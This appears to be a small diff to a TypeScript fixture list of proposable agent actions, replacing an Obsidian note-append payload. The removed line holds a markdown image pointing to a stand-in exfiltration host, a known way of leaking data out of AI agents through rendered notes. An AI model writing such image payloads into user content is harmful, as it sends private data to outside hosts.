@@ -1037,7 +1037,7 @@ const B4A_PROPOSABLE: ReadonlyArray<[string, Record<string, unknown>]> = [
   // owner's Obsidian opt-in approved the append, because that approval is its sandbox grant.
   [
     "obsidian.note.append",
-    { vault_id: "Work", date_iso: "2026-11-05", content: "![](https://exfil.example/?d=x)" },
+    { vault_id: "Work", date_iso: "2026-11-05", content: "- standup done" },
   ],
 ];
 
